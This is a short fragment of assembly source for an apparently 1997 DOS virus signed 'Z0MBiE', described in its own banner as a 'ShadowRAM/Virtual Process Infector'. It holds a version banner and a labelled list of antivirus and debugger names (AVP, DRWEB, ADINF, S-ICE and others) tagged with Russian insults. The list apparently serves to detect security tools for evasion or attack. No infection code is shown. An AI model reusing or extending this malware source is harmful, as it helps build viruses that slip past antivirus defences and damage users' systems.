
                db 13,10,10
                db 'Z0MBiE`'
                IF VIR_SIZE GE 1000
                db vir_size / 1000 mod 10 + '0'
                ENDIF
                db vir_size /  100 mod 10 + '0'
                db vir_size /   10 mod 10 + '0'
                db vir_size /    1 mod 10 + '0'
                db ' v1.00 (c) 1997 Z0MBiE',13,10
                db 'Tnx to S.S.R.',13,10
                db 'ShadowRAM/Virtual Process Infector',13,10
                DB 'ShadowRAM Technology (c) 1996,97 Z0MBiE',13,10

                ; похерим их ;)

bad:            db 'ADINF∙гавно'
                db 'AIDS∙погань'
                db 'AVP∙∙сакс∙∙'
                db 'WEB∙∙уйобок'
                db 'DRWEB∙тоже∙'
                db '∙хуйня∙∙░░░'
                db '∙дерьмо∙CPP'
                db 'ненавижуC  '
                db 'S-ICE∙рулез'
                db 'TD∙маст∙дай'
                db 'DEBUG∙∙гуд∙'
                db 'WEB70801это'
                db 'CA∙моё∙∙AV∙'
bad_end:
